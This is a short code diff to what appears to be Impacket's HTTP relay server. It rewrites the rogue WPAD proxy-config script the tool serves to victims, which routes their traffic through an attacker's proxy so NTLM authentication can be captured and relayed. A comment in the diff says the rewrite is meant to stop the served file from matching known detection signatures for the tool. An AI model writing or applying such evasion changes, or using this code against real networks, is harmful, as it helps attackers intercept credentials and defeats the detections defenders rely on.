@@ -62,9 +62,25 @@ class HTTPRelayServer(Thread):
             self.domainIp = None
             self.authUser = None
             self.relayToHost = False
-            self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||' \
-                        '(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; ' \
-                        'return "PROXY %s:80; DIRECT";} '
+            # Format the PAC across multiple lines with realistic indentation
+            # so it doesn't match the fixed one-line WPAD body Impacket
+            # historically served.
+            self.wpad = (
+                'function FindProxyForURL(url, host) {\n'
+                '    if (isPlainHostName(host) || shExpMatch(host, "localhost*")) {\n'
+                '        return "DIRECT";\n'
+                '    }\n'
+                '    if (host == "127.0.0.1" || isInNet(host, "10.0.0.0", "255.0.0.0") ||\n'
+                '        isInNet(host, "172.16.0.0", "255.240.0.0") ||\n'
+                '        isInNet(host, "192.168.0.0", "255.255.0.0")) {\n'
+                '        return "DIRECT";\n'
+                '    }\n'
+                '    if (dnsDomainIs(host, "%s")) {\n'
+                '        return "DIRECT";\n'
+                '    }\n'
+                '    return "PROXY %s:80; DIRECT";\n'
+                '}\n'
+            )
             if self.server.config.mode != 'REDIRECT':
                 if self.server.config.target is None:
                     # Reflection mode, defaults to SMB at the target, for now
